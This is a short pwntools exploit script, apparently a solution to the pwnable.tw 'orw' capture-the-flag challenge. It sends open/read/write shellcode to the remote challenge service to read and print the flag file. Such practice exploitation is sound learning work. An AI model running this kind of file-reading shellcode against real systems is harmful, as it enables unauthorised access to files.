```python
from pwn import *

local = True
local = False
context.binary = ELF("orw")
if local:
    p = process("orw")
    gdb.attach(p)
else:
    p = remote("chall.pwnable.tw", 10001)

shellcode = ""
shellcode += pwnlib.shellcraft.open("/home/orw/flag").rstrip()
shellcode += pwnlib.shellcraft.read('eax', 'esp', 64).rstrip()
shellcode += pwnlib.shellcraft.write(1, 'esp', 64).rstrip()

p.sendlineafter(b":", asm(shellcode))
p.interactive()
```
